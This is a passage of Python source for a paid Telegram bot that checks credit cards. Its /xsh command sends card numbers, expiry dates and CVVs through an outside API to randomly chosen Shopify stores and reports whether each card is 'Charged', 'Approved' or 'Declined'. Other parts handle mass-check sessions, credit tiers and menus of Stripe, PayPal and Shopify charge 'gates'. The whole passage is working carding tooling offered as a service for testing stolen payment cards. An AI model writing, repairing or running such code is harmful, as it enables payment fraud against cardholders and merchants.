    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")

    max_retries = 3
    retry_count = 0
    last_error = None
    api_response = None

    while retry_count < max_retries:
        try:
            site_url = random.choice(SHOPIFY_SITES)
            params = {
                "cc": f"{card_number}|{month}|{year}|{cvv}",
                "url": site_url,
                "proxy": "",
            }

            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL, params=params, timeout=aiohttp.ClientTimeout(total=60)) as response:
                    try:
                        api_response = await response.json()
                    except Exception:
                        text = await response.text()
                        api_response = {"status": "Error", "message": text}
            break

        except Exception as e:
            logger.error(f"Error checking card (attempt {retry_count + 1}): {e}")
            last_error = str(e)
            retry_count += 1
            if retry_count < max_retries:
                await asyncio.sleep(1)

    if api_response is None:
        return f"⚠️ <b>Error checking card after {max_retries} attempts:</b> <code>{last_error}</code>"

    return xsh_format_response(api_response, user_info, card_details, brand, issuer, country_name, country_flag)


def xsh_format_response(api_response: Dict, user_info: Dict, card_details: str,
                    brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    message = str(api_response.get("Response", api_response.get("message", "N/A")))
    status = str(api_response.get("status", "N/A")).lower()

    if "charged" in status or "success" in status or "captured" in status:
        status_text = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙"
        status_emoji = "🔥"
    elif "approved" in status:
        status_text = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
        status_emoji = "🟢"
    elif "declined" in status:
        status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
        status_emoji = "❌"
    else:
        if any(kw in message.lower() for kw in ["thank", "success", "approved", "charged"]):
            status_text = "𝘾𝙝𝙖𝙧𝙜𝙚𝙙"
            status_emoji = "🔥"
        elif any(kw in message.lower() for kw in ["decline", "insufficient", "error", "fail"]):
            status_text = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
            status_emoji = "❌"
        else:
            status_text = "𝙀𝙧𝙧𝙤𝙧"
            status_emoji = "⚠️"

    user_id = user_info.get("id", "Unknown")
    first_name = html.escape(user_info.get("first_name", "User"))
    user_tier = get_user_current_tier(user_id)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"

    formatted = f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>{status_text}</b> {status_emoji}</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗫𝗮𝗲𝗱𝗲𝗻 𝗦𝗵𝗼𝗽𝗶𝗳𝘆</i>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{message}</code>
<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""

    return formatted


async def handle_xsh_command(update, context):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    user_tier = get_user_current_tier(user_id)

    current_time = datetime.now()
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML",
            )
            return

    card_details = None
    if context.args:
        card_details = " ".join(context.args)
    elif update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = xsh_extract_card_from_text(replied_text)

    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /xsh card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /xsh</i>",
            parse_mode="HTML",
        )
        return

    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float("inf")
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)

    if not has_credits:
        await update.message.reply_text(
            f"<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝘾𝙧𝙚𝙙𝙞𝙩𝙨:</b>\n\n"
            f"<i>You have 0 credits left. Please recharge to continue.</i>\n\n"
            f"<b>Current Tier:</b> <code>{user_tier}</code>",
            parse_mode="HTML",
        )
        return

    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time

    progress_msg = (
        f"<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>\n"
        f"<pre>{card_details}</pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗫𝗮𝗲𝗱𝗲𝗻 𝗦𝗵𝗼𝗽𝗶𝗳𝘆</i>"
    )
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")

    user_info = {"id": user_id, "username": username, "first_name": first_name}

    async def background_check():
        try:
            result = await xsh_check_card(card_details, user_info)
            if result and not result.startswith("⚠️"):
                if not is_unlimited:
                    update_user_credits(user_id, -1)
                    updated = get_user_credits(user_id)
                    if updated is not None and updated <= 0:
                        result += "\n\n<a href='https://t.me/rev3rsex'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>"
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            await checking_message.edit_text(f"⚠️ <b>Error:</b> <code>{e}</code>", parse_mode="HTML")

    asyncio.create_task(background_check())



# ============================================================
# MODULE: stop
# ============================================================
# Import active mass check dictionaries from each module

# Import format functions from each module


async def handle_stop_command(update: Update, context: CallbackContext):
    """
    Handle /stop command to stop a specific mass check session.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Extract session ID from command arguments
    if not context.args:
        # List all active sessions for this user
        user_sessions = []
        
        # Check MSH sessions
        for session_id, data in msh_active_checks.items():
            if data["user_id"] == user_id:
                user_sessions.append(("MSH", session_id))
        
        # Check MSK sessions (Ensure you have msk.py if you use this)
        # from msk import active_mass_checks as msk_active_checks
        # try:
        #     for session_id, data in msk_active_checks.items():
        #         if data["user_id"] == user_id:
        #             user_sessions.append(("MSK", session_id))
        # except: pass
        
        # Check MAU sessions
        for session_id, data in mau_active_mass_checks.items():
            if data["user_id"] == user_id:
                user_sessions.append(("MAU", session_id))
        
        
        if not user_sessions:
            await update.message.reply_text(
                "⚠️ <b>No active mass check sessions found.</b>\n\n"
                "<i>Start a mass check with /msh, /msk, /mau, first.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        
        session_list = "\n".join([f"• <code>{module} {session_id}</code>" for module, session_id in user_sessions])
        await update.message.reply_text(
            f"📋 <b>Your active mass check sessions:</b>\n\n"
            f"{session_list}\n\n"
            f"<i>Use /stop &lt;session_id&gt; to stop a specific session.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    session_id = context.args[0].upper()
    
    # Find the session in any of the active check dictionaries
    session_found = False
    session_module = None
    active_dict = None
    format_func = None
    
    # Check MSH sessions
    if session_id in msh_active_checks:
        session_module = "MSH"
        session_found = True
        active_dict = msh_active_checks
        format_func = msh_format_stopped
        
        
    # Check MAU sessions
    elif session_id in mau_active_mass_checks:
        session_module = "MAU"
        session_found = True
        active_dict = mau_active_mass_checks
        format_func = mau_format_final
        
    
    if not session_found:
        await update.message.reply_text(
            f"⚠️ <b>No active mass check session found with ID:</b> <code>{session_id}</code>\n\n"
            "<i>Check session ID and try again.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Check if the user who sent the command is the same as the one who initiated the check
    if active_dict[session_id]["user_id"] != user_id:
        await update.message.reply_text(
            "⛔ <b>Access denied!</b>\n\n"
            "<i>You can only stop your own mass check sessions.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Set stop flag and event for this session - IMMEDIATE STOP
    active_dict[session_id]["stopped"] = True
    stop_event = active_dict[session_id].get("stop_event")
    if stop_event:
        stop_event.set()
    
    logger.info(f"Stop requested by user {user_id} for {session_module} session {session_id}")
    
    # Cancel all running tasks for this session with immediate effect
    if "workers" in active_dict[session_id]:
        for task in active_dict[session_id]["workers"]:
            if not task.done():
                task.cancel()
                logger.info(f"Cancelled {session_module} task for session {session_id}")
    
    # Calculate elapsed time
    start_time = active_dict[session_id].get("start_time", time.time())
    elapsed_time = round(abs(time.time() - start_time), 2)
    
    # Get stats from active_dict
    stats = active_dict[session_id].get("stats", {
        "total": 0,
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    })
    
    # Get chat_id and message_id
    chat_id = active_dict[session_id].get("chat_id")
    message_id = active_dict[session_id].get("message_id")
    
    # Update progress message to show "Stopped" without stop button
    if chat_id and message_id:
        try:
            # MSH and MPV require session_id in format_stopped, 
            # others (MAU, MSK, MTXT, MST) use format_final_response with stopped=True as 3rd arg
            if session_module in ["MSH", "MPV"]:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=format_func(stats, elapsed_time, first_name, session_id),
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
            else:
                # MAU, MSK, MTXT, MST use format_final_response with stopped=True
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=format_func(stats, elapsed_time, first_name, True),
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
        except Exception as e:
            # If we get a "Message is not modified" error, try to send a new message
            if "Message is not modified" in str(e):
                try:
                    if session_module in ["MSH", "MPV"]:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=format_func(stats, elapsed_time, first_name, session_id),
                            parse_mode="HTML",
                            disable_web_page_preview=True
                        )
                    else:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=format_func(stats, elapsed_time, first_name, True),
                            parse_mode="HTML",
                            disable_web_page_preview=True
                        )
                except Exception as e2:
                    logger.error(f"Error sending {session_module} stop message: {str(e2)}")
            else:
                logger.error(f"Error updating {session_module} stop message: {str(e)}")
    
    # Send confirmation message to user
    await update.message.reply_text(
        f"✅ <b>{session_module} session stopped successfully!</b>\n\n"
        f"<b>Session ID:</b> <code>{session_id}</code>\n"
        f"<b>Cards checked:</b> <code>{stats['checked']}/{stats['total']}</code>\n"
        f"<b>Time elapsed:</b> <code>{elapsed_time}s</code>",
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    # NOTE: DO NOT DELETE from active_dict HERE.
    # The main process function will handle cleanup after its tasks are fully cancelled.
    # This prevents KeyError race condition.



# ============================================================
# MODULE: main
# ============================================================
# Add these imports at the top of your file

# Make sure logger is defined globally
logger = logging.getLogger(__name__)
# ==============================
# PYROGRAM LIFECYCLE (VERY IMPORTANT)
# ==============================

async def on_startup(application):
    if SESSION_STRING:
        logger.info("🚀 Starting Pyrogram user client...")
        await initialize_pyrogram()
    else:
        logger.info("⚠️ SESSION_STRING not set, Pyrogram scraping disabled")

async def on_shutdown(application):
    if SESSION_STRING:
        logger.info("🛑 Stopping Pyrogram user client...")
        await stop_pyrogram()

# Import forcejoin functionality
# Import all command handlers
# Import new proxy and mpp handlers
# Import new msk handler
# Import database functions
# ==============================
# DATABASE CONFIGURATION
# ==============================
# Database connection parameters are hardcoded in the database module above


# ==============================
# TIMEZONE SETUP
# ==============================
# Admin user ID (replace with your actual admin ID)
ADMIN_ID = 7742548417

# ==============================
# HELPER FUNCTIONS FOR TIMEOUT HANDLING
# ==============================
# Function to safely send messages with retry logic
async def safe_send_message(context, chat_id, text, parse_mode=None, reply_markup=None, retries=3):
    for attempt in range(retries):
        try:
            return await context.bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except (TimedOut, NetworkError) as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)  # Wait before retrying
                continue
            else:
                logging.error(f"Failed to send message after {retries} attempts: {e}")
                raise
        except Exception as e:
            logging.error(f"Unexpected error sending message: {e}")
            raise

# Function to safely edit messages with retry logic
async def safe_edit_message(context, chat_id, message_id, text=None, reply_markup=None, 
                          parse_mode=None, retries=3):
    for attempt in range(retries):
        try:
            if text:
                return await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=parse_mode,
                    reply_markup=reply_markup
                )
            else:
                return await context.bot.edit_message_reply_markup(
                    chat_id=chat_id,
                    message_id=message_id,
                    reply_markup=reply_markup
                )
        except BadRequest as e:
            err_msg = str(e).lower()
            if "no text" in err_msg or "can't parse" in err_msg or "message is not modified" in err_msg:
                logging.warning(f"Edit message skipped: {e}")
                if "can't parse" in err_msg and parse_mode == "HTML" and text:
                    try:
                        return await context.bot.edit_message_text(
                            chat_id=chat_id, message_id=message_id,
                            text=text, parse_mode=None, reply_markup=reply_markup
                        )
                    except Exception:
                        pass
                return None
            raise
        except (TimedOut, NetworkError) as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)
                continue
            else:
                logging.error(f"Failed to edit message after {retries} attempts: {e}")
                return None
        except Exception as e:
            logging.error(f"Unexpected error editing message: {e}")
            return None

# Function to safely edit message media with retry logic
async def safe_edit_message_media(context, chat_id, message_id, media, reply_markup=None, retries=3):
    for attempt in range(retries):
        try:
            return await context.bot.edit_message_media(
                chat_id=chat_id,
                message_id=message_id,
                media=media,
                reply_markup=reply_markup
            )
        except (TimedOut, NetworkError) as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)  # Wait before retrying
                continue
            else:
                logging.error(f"Failed to edit message media after {retries} attempts: {e}")
                raise
        except Exception as e:
            logging.error(f"Unexpected error editing message media: {e}")
            raise

# Function to safely send photos with retry logic
async def safe_send_photo(context, chat_id, photo, caption=None, parse_mode=None, 
                         reply_markup=None, retries=3):
    for attempt in range(retries):
        try:
            return await context.bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                parse_mode=parse_mode,
                reply_markup=reply_markup
            )
        except (TimedOut, NetworkError) as e:
            if attempt < retries - 1:
                await asyncio.sleep(1)  # Wait before retrying
                continue
            else:
                logging.error(f"Failed to send photo after {retries} attempts: {e}")
                raise
        except Exception as e:
            logging.error(f"Unexpected error sending photo: {e}")
            raise

# Function to safely answer callback queries with retry logic
async def safe_answer_callback_query(query, text=None, show_alert=False, retries=3):
    for attempt in range(retries):
        try:
            return await query.answer(text=text, show_alert=show_alert)
        except BadRequest as e:
            logging.warning(f"Callback query expired or invalid: {e}")
            return None
        except (TimedOut, NetworkError) as e:
            if attempt < retries - 1:
                await asyncio.sleep(0.5)
                continue
            else:
                logging.error(f"Failed to answer callback query after {retries} attempts: {e}")
                return None
        except Exception as e:
            logging.error(f"Unexpected error answering callback query: {e}")
            raise

# ==============================
# START COMMAND (DIRECT - NO ANIMATION)
# ==============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(start_sequence(update.effective_chat.id, context, update.effective_user, is_new_message=True))

async def start_sequence(chat_id, context, user, is_new_message=True):
    user_id = user.id
    # Fixed: Store actual username (or None) in database, not a fallback
    username = user.username if user.username else None

    # Create tasks to run in parallel
    async def fetch_user_data():
        loop = asyncio.get_running_loop()
        # Run synchronous DB call in a thread to not block event loop
        return await loop.run_in_executor(executor, get_or_create_user, user_id, username)

    # Fetch user data with timeout
    try:
        db_user_data = await asyncio.wait_for(fetch_user_data(), timeout=5.0)
    except asyncio.TimeoutError:
        error_msg = """
<a href='https://t.me/rev3rsex'>⚠️</a> <b>Database Connection Timeout</b>
<pre>⊀ Error: Database request timed out</pre>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Action Required:</b> Please try again later
<a href='https://t.me/rev3rsex'>⌬</a> <b>Support:</b> <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
        await safe_send_message(context, chat_id, error_msg, parse_mode=ParseMode.HTML)
        return
    
    if not db_user_data:
        error_msg = """
<a href='https://t.me/rev3rsex'>⚠️</a> <b>Database Connection Failed</b>
<pre>⊀ Error: Unable to connect to database</pre>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Action Required:</b> Please contact support
<a href='https://t.me/rev3rsex'>⌬</a> <b>Support:</b> <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
        await safe_send_message(context, chat_id, error_msg, parse_mode=ParseMode.HTML)
        return

    # --- At this point, db_user_data is available ---
    db_username, db_joined_date, db_tier, db_credits = db_user_data

    # Get real-time credits to check for unlimited
    current_credits = get_user_credits(user_id)
    if current_credits == float('inf'):
        credits_display = "Infinite😎"
    else:
        credits_display = str(db_credits)  # Use value from initial query

    # Format datetime properly to ensure correct timezone display
    # Use our new function to format in Indian time
    formatted_joined_date = format_indian_datetime(db_joined_date)
    
    # Fixed: Display username properly - add @ if username exists, otherwise show "None"
    # Also escape any special characters that might interfere with HTML
    display_username = f"@{html.escape(db_username)}" if db_username else "None"
    # Escape first name as well
    escaped_first_name = html.escape(user.first_name)

    # ==============================
    # PROFILE CARD DESIGN
    # ==============================
    caption = f"""
<pre>⊀ 𝑺𝒕𝒂𝒕𝒖𝒔: 𝐀𝐜𝐭𝐢𝐯𝐞 ✅</pre>

<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐈𝐃</b> ↬ <code>{user_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {display_username}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐌𝒂𝒏𝒆</b> ↬ <a href='tg://user?id={user_id}'>{escaped_first_name}</a> <code>[{html.escape(db_tier)}]</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬</b> ↬ <code>{credits_display}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐉𝒐𝒏𝒆𝒅</b> ↬ <code>{formatted_joined_date}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>"""

    # Send final message directly without animation
    try:
        # Fixed: Validate image URL and add fallback mechanism
        image_url = "https://i.ibb.co/23msBQcg/00000000885871faa4db7f9fcba72f86.png"
        
        # Add debug logging for image URL validation
        try:
            response = requests.head(image_url, timeout=5)
            if response.status_code != 200:
                # Fallback to a default image if the URL is invalid
                image_url = "https://i.ibb.co/23msBQcg/00000000885871faa4db7f9fcba72f86.png"
        except:
            image_url = "https://i.ibb.co/23msBQcg/00000000885871faa4db7f9fcba72f86.png"
        
        # Send message with image and buttons - properly arranged in 2 columns
        await safe_send_photo(
            context=context,
            chat_id=chat_id,
            photo=image_url,
            caption=caption.strip(),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Gates", callback_data="menu_gates"), InlineKeyboardButton("Pricing", callback_data="menu_pricing")],
                [InlineKeyboardButton("Group", url="https://t.me/stripenigga"), InlineKeyboardButton("Updates", url="https://t.me/stripenigga")],
                [InlineKeyboardButton("Dev", url="https://t.me/rev3rsex"), InlineKeyboardButton("Support", url="https://t.me/rev3rsex")]
            ]),
        )
    except Exception as e:
        # Enhanced error handling with more detailed logging
        error_details = f"Photo send failed: {str(e)}"
        print(f"ERROR: {error_details}")  # Add proper logging
        
        # Fallback to text-only message if photo fails
        fallback_msg = f"""
<a href='https://t.me/rev3rsex'>⚠️</a> <b>Profile Display Issue</b>
<pre>⊀ Error: Unable to load profile image</pre>
<a href='https://t.me/rev3rsex'>ℭ</a> <b>Action:</b> Profile details below:
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐈𝐃</b> ↬ <code>{user_id}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {display_username}
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐌𝒂𝒏𝒆</b> ↬ <a href='tg://user?id={user_id}'>{escaped_first_name}</a> <code>[{html.escape(db_tier)}]</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬</b> ↬ <code>{credits_display}</code>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐉𝒐𝒏𝒆𝒅</b> ↬ <code>{formatted_joined_date}</code>
<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/rev3rsex'>@rev3rsex</a>
"""
        await safe_send_message(context, chat_id, fallback_msg, parse_mode=ParseMode.HTML)

# ==============================
# CALLBACK HANDLER
# ==============================
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    chat_id = query.message.chat_id
    message_id = query.message.message_id
    await safe_answer_callback_query(query)

    # Get the photo from current message to reuse it
    photo = query.message.photo[-1] if query.message.photo else None
    photo_file_id = photo.file_id if photo else None

    # GATES MENU
    if data == "menu_gates":
        kb = [
            [
                InlineKeyboardButton("Auth", callback_data="auth_menu"),
                InlineKeyboardButton("Charge", callback_data="charge_menu")
            ],
            [
                InlineKeyboardButton("Mass Gates", callback_data="mass_gates_menu")
            ],
            [InlineKeyboardButton("Back", callback_data="back_main")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption="<b>⚡ Choose your gateway mode:</b>", parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text="<b>⚡ Choose your gateway mode:</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # MASS GATES MENU - NO BUTTONS FOR GATEWAYS
    elif data == "mass_gates_menu":
        # All gates are now shown as online without checking status
        text = f"""
<b>⚡ MASS GATES STATUS</b>
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Mass Stripe Auth</i>  
<b><i>Command ↬</i></b> <i>/mau</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Shopify Random</i>  
<b><i>Command ↬</i></b> <i>/msh</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="menu_gates")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # MASS AUTH MENU - REMOVED AS PER REQUEST
    elif data == "mass_auth_menu":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Mass Stripe Auth</i>  
<b><i>Command ↬</i></b> <i>/mtxt</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="mass_gates_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # MASS CHARGE MENU - REMOVED AS PER REQUEST
    elif data == "mass_charge_menu":
        kb = [
            [
                InlineKeyboardButton("Shopify", callback_data="mass_charge_shopify"),
                InlineKeyboardButton("Paypal", callback_data="mass_charge_paypal")
            ],
            [
                InlineKeyboardButton("SK Based", callback_data="mass_charge_sk")
            ],
            [InlineKeyboardButton("Back", callback_data="mass_gates_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption="<b>⚡ Choose mass charge gateway:</b>", parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text="<b>⚡ Choose mass charge gateway:</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # MASS CHARGE CATEGORY MENUS - REMOVED AS PER REQUEST
    elif data == "mass_charge_shopify":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Shopify Random</i>  
<b><i>Command ↬</i></b> <i>/msh</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="mass_charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise



    elif data == "mass_charge_sk":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>SK Based 1$</i>  
<b><i>Command ↬</i></b> <i>/msk</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
            [InlineKeyboardButton("Back", callback_data="mass_charge_menu")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # CHARGE MENU
    elif data == "charge_menu":
        kb = [
            [
                InlineKeyboardButton("Stripe", callback_data="charge_stripe"),
                InlineKeyboardButton("Paypal", callback_data="charge_paypal")
            ],
            [
                InlineKeyboardButton("PayU", callback_data="charge_payu"),
                InlineKeyboardButton("Razorpay", callback_data="charge_razorpay")
            ],
            [
                InlineKeyboardButton("Shopify", callback_data="charge_shopify"),
                InlineKeyboardButton("PayFast", callback_data="charge_payfast")
            ],
            [InlineKeyboardButton("Back", callback_data="menu_gates")]
        ]
        
        try:
            if photo_file_id:
                await safe_edit_message_media(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    media=InputMediaPhoto(media=photo_file_id, caption="<b>⚡ Choose charge gateway:</b>", parse_mode=ParseMode.HTML),
                    reply_markup=InlineKeyboardMarkup(kb)
                )
            else:
                await safe_edit_message(
                    context=context,
                    chat_id=chat_id,
                    message_id=message_id,
                    text="<b>⚡ Choose charge gateway:</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(kb)
                )
        except BadRequest as e:
            if "Message is not modified" in str(e):
                # Ignore this specific error
                pass
            else:
                # Re-raise other errors
                raise

    # CHARGE CATEGORY MENUS
    elif data == "charge_stripe":
        # All gates are now shown as online without checking status
        text = f"""
━━━━━━━━━━━━━━━━
<b><i>Gate ↬</i></b> <i>Stripe 0.50$</i>  
<b><i>Command ↬</i></b> <i>/st</i>  
<b><i>Status ↬</i></b> <i>Online ✅</i>
━━━━━━━━━━━━━━━━
"""
        kb = [
